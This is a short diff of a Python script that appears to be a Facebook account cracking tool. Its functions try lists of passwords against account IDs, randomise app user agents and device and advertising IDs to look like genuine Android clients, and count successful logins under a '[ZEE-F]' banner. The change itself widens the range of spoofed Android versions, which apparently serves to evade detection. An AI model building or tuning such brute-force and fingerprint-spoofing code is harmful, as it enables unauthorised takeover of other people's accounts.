@@ -631,7 +631,7 @@ def api1(ids,names,passlist):
                 except Exception as e:
                         pass
 def rndm(ids,passlist):
-               try:
+                try:
                         global ok,loop
                         sys.stdout.write('\r\r\033[1;37m [ZEE-F] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         for pas in passlist:
@@ -640,7 +640,7 @@ def rndm(ids,passlist):
                                 fbs=random.choice(fbks)
                                 gtt=random.choice(xxxxx)
                                 gttt=random.choice(xxxxx)
-                                android_version=str(random.randrange(10,11))
+                                android_version=str(random.randrange(6,13))
                                 ua_string = f'Mozilla/5.0 (Linux; Android 10; RMX2020 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/284.0.0.16.119;]'
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
